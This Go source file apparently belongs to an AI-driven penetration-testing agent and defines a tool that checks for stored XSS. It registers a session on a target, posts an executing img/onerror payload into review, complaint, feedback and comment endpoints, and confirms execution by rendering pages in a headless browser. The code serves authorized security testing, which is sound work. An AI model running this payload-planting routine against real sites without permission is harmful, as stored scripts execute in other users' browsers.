package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	actool "artemis/engine/tool"
)

// Deterministic verifier for STORED (persisted) XSS (Juice Shop V08 family, OWASP
// A03). The invariant: user-supplied content that is stored and later rendered in
// another user's page must be neutralized; if a stored payload EXECUTES when the
// page is rendered, it is a persisted XSS. A weak model posts <script> to a JSON API
// and never renders the SPA. This oracle does store-then-render in code:
//
//   - self-provision a session, store a canonical executing payload (img/onerror)
//     into generic user-content endpoints (reviews/comments/complaints/feedback),
//     under several candidate field names so whichever the server reads is set.
//   - render candidate display routes in a real headless browser (reusing the XSS
//     oracle in --render-only mode) and confirm only if the stored payload actually
//     EXECUTES (alert/__hit), not merely if it is stored unescaped.
//
// Generic technique (endpoint/field wordlists, canonical payload), no target fact.
// Honest limit: some apps surface persisted content through an unusual vector (e.g.
// an admin-only page, or a header-driven field) that a generic content-endpoint +
// generic display-route sweep will miss; then this false-negatives (it never
// false-positives, since a confirm requires real execution in the rendered DOM).

const storedXSSMarker = "ARTEMIS_STORED_XSS"

// storedXSSPayload executes on render (img onerror) and also carries a text marker.
var storedXSSPayload = `<img src=x onerror="alert('` + storedXSSMarker + `')"> ` + storedXSSMarker

// storedContentPaths: generic user-content sinks. %d is substituted with a small
// product-id range for review-style endpoints; paths without %d are posted as-is.
var storedContentPaths = []struct {
	method, tmpl string
	withID       bool
}{
	{http.MethodPut, "/rest/products/%d/reviews", true},
	{http.MethodPost, "/rest/products/%d/reviews", true},
	{http.MethodPost, "/api/Complaints", false},
	{http.MethodPost, "/api/Feedbacks", false},
	{http.MethodPost, "/api/Comments", false},
}

// storedDisplayRoutes: generic SPA routes where stored content may be rendered.
var storedDisplayRoutes = []string{"/", "/#/", "/#/search", "/#/about", "/#/contact"}

// storedContentBody sets the payload under every likely content field plus common
// filler fields, so whichever the server binds receives the payload.
func storedContentBody(payload, author string) []byte {
	b := map[string]any{
		"message": payload, "comment": payload, "text": payload,
		"content": payload, "body": payload, "title": payload,
		"author": author, "rating": 1,
	}
	raw, _ := json.Marshal(b)
	return raw
}

// renderExecutes runs the XSS oracle in render-only mode against url and reports
// whether a stored payload executed in the rendered DOM.
func renderExecutes(ctx context.Context, url string) bool {
	script, err := xssOracleScript()
	if err != nil {
		return false
	}
	runCtx, cancel := context.WithTimeout(ctx, 40*time.Second)
	defer cancel()
	cmd := exec.CommandContext(runCtx, "node", script, "--render-only", url)
	cmd.Env = append(os.Environ(), "NODE_PATH=/usr/lib/node_modules")
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	var res xssOracleOut
	if json.Unmarshal(out, &res) != nil {
		return false
	}
	return res.Confirmed
}

const storedXSSMaxStores = 40

func (t *ToolSet) storedXSSVerify() actool.CoreTool {
	schema := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"url": map[string]any{
				"type":        "string",
				"description": "Base URL of the target, e.g. http://host:3000. The verifier self-registers, stores an executing payload into common content endpoints, then renders the app and checks whether it executes; no path or credentials needed.",
			},
		},
		"required": []any{"url"},
	}
	desc := "Deterministically CONFIRM or REFUTE STORED/persisted XSS. It self-provisions a session, stores a canonical executing payload (img/onerror) into generic user-content endpoints (reviews/comments/complaints/feedback), then renders the app in a real headless browser and confirms only if the stored payload actually EXECUTES in the DOM (not merely stored unescaped). Use this instead of posting <script> to a JSON API and guessing. Pass the base URL."
	return readTool("stored_xss_verify", desc, schema, func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
		var a struct {
			URL string `json:"url"`
		}
		_ = json.Unmarshal(in, &a)
		raw := strings.TrimSpace(a.URL)
		if raw == "" {
			return actool.Errorf("url is required: pass the target base URL, e.g. http://host:3000"), nil
		}
		base, err := url.Parse(raw)
		if err != nil || base.Host == "" {
			return actool.Errorf("stored_xss_verify needs an absolute URL (scheme://host[:port]), got: " + clipXSS(raw, 120)), nil
		}
		root := base.Scheme + "://" + base.Host
		client := &http.Client{Timeout: 8 * time.Second, CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }}
		runCtx, cancel := context.WithTimeout(ctx, 150*time.Second)
		defer cancel()
		budget := storedXSSMaxStores

		sess, ok := provisionSession(runCtx, client, root, "x", &budget)
		token := ""
		author := "artemis@artemis.invalid"
		if ok {
			token = sess.token
			author = sess.email
		}
		// Store the payload into every candidate sink (best-effort; ignore failures).
		stored := 0
		body := storedContentBody(storedXSSPayload, author)
		for _, sp := range storedContentPaths {
			if runCtx.Err() != nil || budget <= 0 {
				break
			}
			paths := []string{sp.tmpl}
			if sp.withID {
				paths = []string{fmt.Sprintf(sp.tmpl, 1), fmt.Sprintf(sp.tmpl, 2), fmt.Sprintf(sp.tmpl, 3)}
			}
			for _, p := range paths {
				if budget <= 0 {
					break
				}
				budget--
				st, _, okc := bearerReq(runCtx, client, sp.method, root+p, token, body)
				if okc && st >= 200 && st < 300 {
					stored++
				}
			}
		}

		// Render candidate display routes; confirm on real execution.
		for _, r := range storedDisplayRoutes {
			if runCtx.Err() != nil {
				break
			}
			if renderExecutes(runCtx, root+r) {
				return actool.Text(fmt.Sprintf(
					"CONFIRMED stored XSS: a payload stored via a content endpoint EXECUTED when rendering %s%s (marker %q). "+
						"This is a verified persisted XSS. report_finding (stored/persisted XSS, high) with the store request and "+
						"the rendered page as reproduction. Do NOT record it as a negative.", root, r, storedXSSMarker)), nil
			}
		}
		return actool.Text(fmt.Sprintf(
			"No stored XSS confirmed: stored the payload into %d content endpoint(s) but it did not execute on the rendered "+
				"display routes tried (%s). Note persisted XSS may surface through an app-specific vector/page not covered by a "+
				"generic content+route sweep. record_fact the negative (inferred); do NOT report_finding.",
			stored, strings.Join(storedDisplayRoutes, ", "))), nil
	})
}

// storedXSSSummaries / intent: fire on the base URL. Text contains "stored"/"XSS" so
// intentClass canonicalizes to "xss" (same family; dedup collapses with reflected on
// the same route only if same endpoint, which differs here).
func storedXSSSummaries(s Surface, _ int) []string {
	if strings.TrimSpace(s.Base) == "" {
		return nil
	}
	return []string{storedXSSIntentSummary(s.Base)}
}

func storedXSSIntentSummary(base string) string {
	return fmt.Sprintf(
		"Stored (persisted) XSS check: call stored_xss_verify with the base URL %s. It stores an executing payload into "+
			"content endpoints (reviews/comments/feedback) then renders the app to see if it executes. If CONFIRMED, "+
			"report_finding (stored XSS). If not, record_fact the negative (inferred) and do NOT report_finding.",
		base)
}
